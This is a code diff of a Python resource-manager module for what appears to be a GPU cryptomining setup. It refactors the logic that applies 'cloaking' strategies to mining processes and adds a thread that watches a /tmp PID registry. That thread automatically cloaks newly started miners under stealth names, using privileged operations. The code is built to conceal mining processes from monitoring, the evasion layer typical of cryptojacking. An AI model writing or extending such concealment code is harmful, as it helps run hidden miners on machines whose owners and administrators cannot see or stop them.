@@ -1,7 +1,8 @@
 """
-**Resource Manager Module** (module quản lý tài nguyên - điều phối và tối ưu hóa GPU resources)
+GPU Resource Management System with cloaking-only architecture.
 
-**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU) với **cloaking-only architecture** (kiến trúc chỉ che giấu).
+Provides centralized GPU resource management, process monitoring,
+and cloaking strategy application for mining processes.
 """
 
 import logging
@@ -15,8 +16,9 @@ import time
 from threading import RLock
 from typing import List, Any, Dict, Optional
 from pathlib import Path
+import os
 
-# **Core Project Imports** (imports dự án cốt lõi)
+# Core project imports
 from mining_environment.scripts.utils import MiningProcess
 from mining_environment.scripts.resource_control import CloakStrategyFactory
 from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
@@ -26,17 +28,17 @@ from mining_environment.scripts.unified_logging import get_unified_logger
 from mining_environment.scripts.error_management import get_error_reporter
 from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
-# **Module Logger** (logger module)
+# Module logger
 module_logger = get_unified_logger('resource_manager')
 
 class SharedResourceManager:
     """
-    **Shared Resource Manager Class** (lớp quản lý tài nguyên chia sẻ)
+    Shared resource manager for GPU operations.
     
-    **Core GPU resource management** (quản lý tài nguyên GPU cốt lõi):
-    - NVML Lifecycle Management
-    - GPU Usage Monitoring  
-    - Cloaking Strategy Application
+    Handles:
+    - NVML lifecycle management
+    - GPU usage monitoring
+    - Cloaking strategy application
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
@@ -44,38 +46,38 @@ class SharedResourceManager:
         self.config = config
         self.resource_managers = resource_managers
         
-        # **Strategy Cache** (bộ đệm chiến lược)
+        # Strategy cache initialization
         self.strategy_cache = get_strategy_cache(
             max_size=500,
             ttl_seconds=7200.0,
             eviction_policy=CacheEvictionPolicy.INTELLIGENT
         )
         
-        # **Privileged Operations** (thao tác đặc quyền)
+        # Privileged operations manager
         self.privileged_manager = get_privileged_manager(logger)
         
-        # **Security Context** (ngữ cảnh bảo mật)
+        # Security context validation
         security_context = self.privileged_manager.validate_security_context()
         self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")
 
-        # **NVML DECOUPLING: Không block nếu NVML fail** (tách rời NVML)
+        # NVML initialization with decoupling - non-blocking if NVML fails
         self._nvml_init = False
-        self._nvml_available = False  # Flag cho biết NVML có khả dụng không
+        self._nvml_available = False
         
-        # Thử khởi tạo NVML nhưng không throw exception nếu fail
+        # Try NVML initialization without throwing exceptions on failure
         try:
             self.initialize_nvml()
-            self.logger.info("✅ SharedResourceManager khởi tạo với NVML")
+            self.logger.info("SharedResourceManager initialized with NVML support")
         except Exception as e:
-            self.logger.warning(f"⚠️ NVML không khả dụng: {e}")
-            self.logger.info("🔄 SharedResourceManager hoạt động ở chế độ fallback (không có NVML)")
-            # Không raise exception - hệ thống vẫn tiếp tục với limited functionality
+            self.logger.warning(f"NVML unavailable: {e}")
+            self.logger.info("SharedResourceManager operating in fallback mode (no NVML)")
+            # Continue without raising exception - system continues with limited functionality
 
     def is_nvml_initialized(self) -> bool:
         return self._nvml_init
 
-    def initialize_nvml(self):
-        """**Thread-Safe NVML Initialization** (khởi tạo NVML an toàn luồng)"""
+    def initialize_nvml(self) -> None:
+        """Thread-safe NVML initialization"""
         if self._nvml_init:
             return
 
@@ -87,18 +89,18 @@ class SharedResourceManager:
             with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                 future = executor.submit(nvml_init_worker)
                 try:
-                    # Giảm timeout để không block lâu
+                    # Reduced timeout to prevent long blocking
                     timeout = getattr(self.config, 'nvml_init_timeout', 2.0) 
                     result = future.result(timeout=timeout)
                     if result:
                         self._nvml_init = True
                         self._nvml_available = True
-                        self.logger.info("✅ NVML khởi tạo thành công")
+                        self.logger.info("NVML initialization successful")
                 except concurrent.futures.TimeoutError:
-                    self.logger.warning("NVML khởi tạo timeout")
+                    self.logger.warning("NVML initialization timeout")
                     raise
         except Exception as e:
-            self.logger.error(f"NVML khởi tạo thất bại: {e}")
+            self.logger.error(f"NVML initialization failed: {e}")
             raise
 
     def shutdown_nvml(self):
@@ -270,6 +272,18 @@ class ResourceManager(IResourceManager):
                 'monitoring_cycles': 0
             }
             
+            # **🥇 SOLUTION 1: File-Based Scanner Configuration** (cấu hình scanner dựa trên file)
+            self._file_scanner_enabled = True
+            self._file_scanner_interval = 10.0  # Check every 10 seconds
+            self._pid_file_directory = Path("/tmp/ncs_pid_registry")  # Monitor this directory
+            self._last_scanner_cycle = 0.0
+            self._scanner_stats = {
+                'files_processed': 0,
+                'pids_discovered': 0,
+                'cloaking_triggered': 0,
+                'scan_cycles': 0
+            }
+            
             # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
             self._setup_direct_registry_observer()
             
@@ -427,100 +441,118 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"Lỗi xử lý process registration: {e}")
 
     def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
-        """**Enhanced Trigger Cloaking** (kích hoạt che giấu nâng cao)"""
+        """Enhanced trigger cloaking with comprehensive strategy application"""
         self.logger.info(f"🎯 [TRIGGER-CLOAKING] Called for PID {process.pid} from source: {source}")
         try:
-            self.logger.info(f"🎯 [TIER-1] trigger_cloaking called for PID {process.pid} from source: {source}")
+            self.logger.info(f"Trigger cloaking called for PID {process.pid} from source: {source}")
+            self.logger.info(f"Process details: name={process.name}, cmd={process.cmd}")
             
-            # **Lazy initialization: thử khởi tạo SharedResourceManager nếu chưa có**
+            # Ensure SharedResourceManager is available
             if not self._ensure_shared_resource_manager():
-                self.logger.warning("SharedResourceManager không khả dụng, bỏ qua cloaking")
-                return
+                self.logger.warning("SharedResourceManager unavailable, skipping cloaking")
+                return False
 
-            # **TIER 1 FIX: Enhanced Determine Strategies** (xác định chiến lược nâng cao)
-            self.logger.info(f"🔍 [TIER-1] _determine_strategies cho PID {process.pid}...")
+            # Determine cloaking strategies for this process
             strategies = self._determine_strategies(process)
-            self.logger.info(f"📋 [TIER-1] Strategies determined: {strategies}")
+            self.logger.info(f"Determined strategies: {strategies}")
             
-            # **TIER 1 FIX: Enhanced Apply Strategies** (áp dụng chiến lược nâng cao)
-            success_count = 0
-            for strategy_name in strategies:
-                self.logger.info(f"🔧 [TIER-1] Applying strategy: {strategy_name} cho PID {process.pid}")
-                try:
-                    success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
-                    if success:
-                        success_count += 1
-                        self.logger.info(f"✅ [TIER-1] Cloaking thành công: {strategy_name} cho PID {process.pid}")
-                    else:
-                        self.logger.warning(f"⚠️ [TIER-1] Cloaking thất bại: {strategy_name} cho PID {process.pid}")
-                except Exception as strategy_error:
-                    self.logger.error(f"❌ [TIER-1] Strategy {strategy_name} error: {strategy_error}")
+            if not strategies:
+                self.logger.warning(f"No strategies available for PID {process.pid}")
+                return False
             
-            self.logger.info(f"📊 [TIER-1] Cloaking summary: {success_count}/{len(strategies)} strategies successful for PID {process.pid}")
+            # Apply each available strategy
+            return self._apply_strategies(process, strategies)
                     
         except Exception as e:
-            self.logger.error(f"❌ [TIER-1] Lỗi trigger cloaking cho PID {process.pid}: {e}")
+            self.logger.error(f"Error triggering cloaking for PID {process.pid}: {e}")
             import traceback
-            self.logger.error(f"📋 [TIER-1] Full traceback: {traceback.format_exc()}")
+            self.logger.debug(f"Full traceback: {traceback.format_exc()}")
+            return False
+
+    def _apply_strategies(self, process: MiningProcess, strategies: List[str]) -> bool:
+        """Apply cloaking strategies to the process"""
+        success_count = 0
+        
+        for strategy_name in strategies:
+            self.logger.info(f"Applying strategy: {strategy_name} for PID {process.pid}")
+            
+            # Check strategy availability
+            if not self._is_strategy_available(strategy_name):
+                self.logger.warning(f"Strategy {strategy_name} not available, skipping")
+                continue
+            
+            try:
+                success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
+                if success:
+                    success_count += 1
+                    self.logger.info(f"Successfully applied {strategy_name} for PID {process.pid}")
+                else:
+                    self.logger.warning(f"Failed to apply {strategy_name} for PID {process.pid}")
+            except Exception as strategy_error:
+                self.logger.error(f"Strategy {strategy_name} error: {strategy_error}")
+        
+        self.logger.info(f"Cloaking summary: {success_count}/{len(strategies)} strategies successful for PID {process.pid}")
+        return success_count > 0
 
     def _determine_strategies(self, process: MiningProcess) -> List[str]:
-        """**Determine Cloaking Strategies** (xác định chiến lược che giấu)"""
+        """Determine appropriate cloaking strategies for the process"""
         strategies = []
         
         try:
-            # **Default Strategies** (chiến lược mặc định)
+            self.logger.debug(f"Determining strategies for process: {process.name}")
+            
+            # Get strategies from configuration
             if hasattr(self.config, 'cloaking_strategies'):
-                # cloaking_strategies is a dict, get keys that are enabled
+                # Extract enabled strategies from configuration dictionary
                 if isinstance(self.config.cloaking_strategies, dict):
-                    # Get strategy names where enabled=True
                     for strategy_name, strategy_config in self.config.cloaking_strategies.items():
                         if isinstance(strategy_config, dict) and strategy_config.get('enabled', True):
                             strategies.append(strategy_name)
-                        elif strategy_config is True:  # Simple boolean format
+                        elif strategy_config is True:
                             strategies.append(strategy_name)
                 else:
-                    # Fallback if it's somehow a list
-                    strategies = self.config.cloaking_strategies
+                    # Fallback for list-based configuration
+                    strategies = list(self.config.cloaking_strategies)
             else:
                 strategies = ['gpu_cloaking', 'process_cloaking']
-                
-            self.logger.debug(f"Raw strategies before filtering: {strategies}")
-                
-            # **Filter Available Strategies** (lọc chiến lược có sẵn)
-            available_strategies = [s for s in strategies if self._is_strategy_available(s)]
+                self.logger.warning(f"No cloaking strategies in config, using defaults: {strategies}")
+
+            # Filter strategies by availability
+            available_strategies = [
+                strategy for strategy in strategies 
+                if self._is_strategy_available(strategy)
+            ]
             
-            self.logger.debug(f"Available strategies after filtering: {available_strategies}")
-            
+            self.logger.debug(f"Available strategies: {available_strategies}")
             return available_strategies
             
         except Exception as e:
-            self.logger.error(f"Lỗi xác định strategies: {e}")
-            return ['gpu_cloaking']  # fallback
+            self.logger.error(f"Error determining strategies: {e}")
+            return ['gpu_cloaking']  # Fallback to default strategy
 
     def _is_strategy_available(self, strategy_name: str) -> bool:
-        """**Check Strategy Availability** (kiểm tra tính khả dụng của chiến lược)"""
+        """Check if the specified strategy is available for use"""
         try:
-            # CloakStrategyFactory.create_strategy is a static method, needs proper params
+            # Attempt to create strategy instance to verify availability
             from .resource_control import CloakStrategyFactory
             
-            # Prepare resource_managers dict
+            # Prepare parameters for strategy creation
             resource_managers = {'main': self}
+            config_data = self.config.__dict__ if hasattr(self.config, '__dict__') else self.config
             
-            # Call with all required parameters
+            # Try to create strategy instance
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name=strategy_name,
-                config=self.config.__dict__ if hasattr(self.config, '__dict__') else self.config,
+                config=config_data,
                 logger=self.logger,
                 resource_managers=resource_managers,
-                process_type='GPU'  # GPU-only implementation
+                process_type='GPU'
             )
             
-            result = strategy is not None
-            self.logger.debug(f"Strategy '{strategy_name}' availability check: {result}")
-            return result
+            return strategy is not None
             
         except Exception as e:
-            self.logger.debug(f"Error checking strategy '{strategy_name}': {e}")
+            self.logger.debug(f"Strategy '{strategy_name}' not available: {e}")
             return False
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
@@ -622,6 +654,17 @@ class ResourceManager(IResourceManager):
         )
         pid_worker.start()
         self.workers.append(pid_worker)
+        
+        # **🥇 SOLUTION 1: Add File-Based Scanner Thread** (thêm thread scanner dựa trên file)
+        if self._file_scanner_enabled:
+            scanner_worker = threading.Thread(
+                target=self._start_pid_file_scanner,
+                name="PIDFileScanner",
+                daemon=True
+            )
+            scanner_worker.start()
+            self.workers.append(scanner_worker)
+            self.logger.info("✅ [SOLUTION-1] PID File Scanner worker thread started")
         
         self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")
 
@@ -903,6 +946,152 @@ class ResourceManager(IResourceManager):
                         
         except Exception as e:
             self.logger.error(f"❌ [REAPPLY] Failed to reapply cloaking for PID {mining_process.pid}: {e}")
+
+    def _start_pid_file_scanner(self):
+        """
+        **🥇 SOLUTION 1: PID File Scanner Thread** (thread scanner file PID)
+        
+        Enhanced File-Based Scanner để auto-trigger cloaking khi detect new PID files.
+        Monitor /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
+        """
+        self.logger.info(f"🔍 [SOLUTION-1] PID File Scanner started - monitoring directory: {self._pid_file_directory}")
+        
+        while not self._stop_flag:
+            try:
+                current_time = time.time()
+                
+                # **Check if scanner cycle interval elapsed** (kiểm tra khoảng thời gian chu kỳ scanner)
+                if current_time - self._last_scanner_cycle >= self._file_scanner_interval:
+                    self._execute_file_scanner_cycle(current_time)
+                    self._last_scanner_cycle = current_time
+                    self._scanner_stats['scan_cycles'] += 1
+                
+                # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
+                time.sleep(2.0)  # Check every 2 seconds
+                
+            except Exception as e:
+                self.logger.error(f"❌ [SOLUTION-1] File scanner error: {e}")
+                time.sleep(5.0)  # Wait longer on error
+        
+        self.logger.info("🔚 [SOLUTION-1] PID File Scanner stopped")
+    
+    def _execute_file_scanner_cycle(self, current_time: float):
+        """
+        **🥇 SOLUTION 1: Execute File Scanner Cycle** (thực thi chu kỳ scanner file)
+        
+        Scan /tmp/ncs_pid_registry/ directory for new PID files và process chúng.
+        """
+        try:
+            # **Ensure PID directory exists** (đảm bảo thư mục PID tồn tại)
+            if not self._pid_file_directory.exists():
+                self.logger.debug(f"📁 [FILE-SCANNER] PID directory not found: {self._pid_file_directory}")
+                return
+            
+            self.logger.debug(f"🔍 [FILE-SCANNER] Scanning directory: {self._pid_file_directory}")
+            
+            # **Get all PID files** (lấy tất cả file PID)
+            pid_files = list(self._pid_file_directory.glob("pid_*.json"))
+            
+            if not pid_files:
+                self.logger.debug("📂 [FILE-SCANNER] No PID files found")
+                return
+            
+            self.logger.info(f"📋 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
+            
+            processed_count = 0
+            for pid_file in pid_files:
+                try:
+                    success = self._process_pid_file(pid_file)
+                    if success:
+                        processed_count += 1
+                        self._scanner_stats['files_processed'] += 1
+                        
+                        # **Clean up processed file** (dọn dẹp file đã xử lý)
+                        try:
+                            pid_file.unlink()
+                            self.logger.debug(f"🗑️ [FILE-SCANNER] Cleaned up processed file: {pid_file.name}")
+                        except Exception as cleanup_err:
+                            self.logger.warning(f"⚠️ [FILE-SCANNER] Failed to cleanup {pid_file.name}: {cleanup_err}")
+                    
+                except Exception as file_err:
+                    self.logger.error(f"❌ [FILE-SCANNER] Error processing file {pid_file.name}: {file_err}")
+            
+            # **Log cycle results** (ghi log kết quả chu kỳ)
+            self.logger.info(f"📊 [FILE-SCANNER] Cycle complete: {processed_count}/{len(pid_files)} files processed")
+            self.logger.debug(f"📈 [FILE-SCANNER] Stats: Files={self._scanner_stats['files_processed']}, "
+                            f"PIDs={self._scanner_stats['pids_discovered']}, "
+                            f"Cloaked={self._scanner_stats['cloaking_triggered']}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [FILE-SCANNER] Scanner cycle failed: {e}")
+    
+    def _process_pid_file(self, pid_file: Path) -> bool:
+        """
+        **🥇 SOLUTION 1: Process Single PID File** (xử lý file PID đơn)
+        
+        Parse và process một PID file để trigger cloaking.
+        """
+        try:
+            self.logger.debug(f"📄 [FILE-PROCESS] Processing file: {pid_file.name}")
+            
+            # **Read and parse PID file** (đọc và phân tích file PID)
+            import json
+            with open(pid_file, 'r') as f:
+                file_data = json.load(f)
+            
+            # **Extract PID and metadata** (trích xuất PID và metadata)
+            pid = file_data.get('pid')
+            metadata = file_data.get('metadata', {})
+            
+            if not pid:
+                self.logger.warning(f"⚠️ [FILE-PROCESS] No PID found in file: {pid_file.name}")
+                return False
+            
+            self.logger.info(f"🎯 [FILE-PROCESS] Discovered PID {pid} from file {pid_file.name}")
+            self._scanner_stats['pids_discovered'] += 1
+            
+            # **Check if PID already monitored** (kiểm tra PID đã được giám sát chưa)
+            if pid in self._monitored_processes:
+                self.logger.debug(f"ℹ️ [FILE-PROCESS] PID {pid} already monitored, skipping")
+                return True  # Consider it success since it's already handled
+            
+            # **Verify process still exists** (xác minh process vẫn tồn tại)
+            try:
+                import psutil
+                proc = psutil.Process(pid)
+                if not proc.is_running():
+                    self.logger.info(f"💀 [FILE-PROCESS] PID {pid} is no longer running, skipping")
+                    return True  # Success - no need to cloak a dead process
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                self.logger.info(f"💀 [FILE-PROCESS] PID {pid} not accessible, skipping")
+                return True
+            
+            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
+            process_name = metadata.get('stealth_name', f'process_{pid}')
+            cmd = metadata.get('cmd', [])
+            
+            mining_process = MiningProcess(
+                pid=pid,
+                name=process_name,
+                cmd=cmd
+            )
+            
+            # **Trigger cloaking via file scanner** (kích hoạt cloaking qua file scanner)
+            self.logger.info(f"🚀 [FILE-PROCESS] Triggering cloaking for discovered PID {pid}")
+            self.trigger_cloaking(mining_process, 'file_scanner_discovery')
+            
+            # **Add to monitored processes** (thêm vào processes được giám sát)
+            self._monitored_processes[pid] = mining_process
+            self._scanner_stats['cloaking_triggered'] += 1
+            
+            self.logger.info(f"✅ [FILE-PROCESS] Successfully processed PID {pid} via file scanner")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [FILE-PROCESS] Failed to process file {pid_file.name}: {e}")
+            import traceback
+            self.logger.debug(f"🔍 [FILE-PROCESS] Traceback: {traceback.format_exc()}")
+            return False
 
     def stop(self):
         """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
